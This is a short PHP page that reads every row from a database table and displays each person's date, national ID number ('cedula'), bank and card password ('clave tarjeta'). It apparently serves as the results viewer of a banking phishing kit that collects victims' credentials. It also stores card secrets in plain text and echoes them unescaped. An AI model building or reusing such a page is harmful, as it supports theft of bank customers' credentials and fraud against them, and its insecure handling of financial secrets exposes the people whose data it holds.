<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REGISTROS</title>
    <link rel="stylesheet" href="registro.css">
    
</head>
<body>
<?php 
$inc = include("con_db.php");
if ($inc){
	$consulta = "SELECT * FROM productos";
	$resultado = mysqli_query($conex,$consulta);
	if ($resultado) {
		while ($row = $resultado->fetch_array()) {
	    $fecha = $row['fecha'];
		$cedula = $row['cedula'];
	    $banco = $row['banco'];
		$clave = $row['clave'];
	    ?>
        <div>
        	<div>


        		<p>
        			<b>FECHA: </b> <?php echo $fecha ?><br><br>
					<b>CEDULA </b> <?php echo $cedula ?><br><br>
					<b>BANCO </b> <?php echo $banco ?><br><br>
        		    <b>CLAVE TARJETA : </b> <?php echo $clave ?><br>
        		</p>
        	</div>
        </div> 
		
	    <?php
	    }
	}
}
?>
</body>
</html>